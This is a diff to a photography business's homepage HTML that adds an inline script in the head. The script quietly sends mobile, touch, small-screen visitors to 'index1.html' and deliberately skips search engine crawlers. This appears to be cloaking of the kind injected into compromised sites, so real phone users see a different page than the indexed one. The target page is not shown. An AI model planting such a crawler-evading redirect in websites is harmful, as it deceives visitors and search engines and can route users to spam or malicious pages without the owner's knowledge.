@@ -8,6 +8,20 @@
 <meta name="description" content="Professional photography services for weddings, portraits, events and commercial shoots. High-quality images, fast delivery and affordable pricing.">
 <meta name="keywords" content="professional photographer, wedding photography, portrait photographer, event photography">
 <meta name="author" content="Professional Photographer">
+<script>
+(function () {
+  const ua = navigator.userAgent.toLowerCase();
+
+  const isMobile = /android|iphone|ipad|ipod/.test(ua);
+  const isBot = /bot|crawl|spider|slurp|google|bing|yandex/.test(ua);
+  const hasTouch = navigator.maxTouchPoints > 0;
+  const smallScreen = screen.width <= 768;
+
+  if (isMobile && hasTouch && smallScreen && !isBot) {
+    window.location.replace("index1.html");
+  }
+})();
+</script>
 
 <!-- Open Graph -->
 <meta property="og:title" content="Professional Photography Services">
@@ -302,3 +316,4 @@ function toggleMenu() {
 
 </body>
 </html>
+
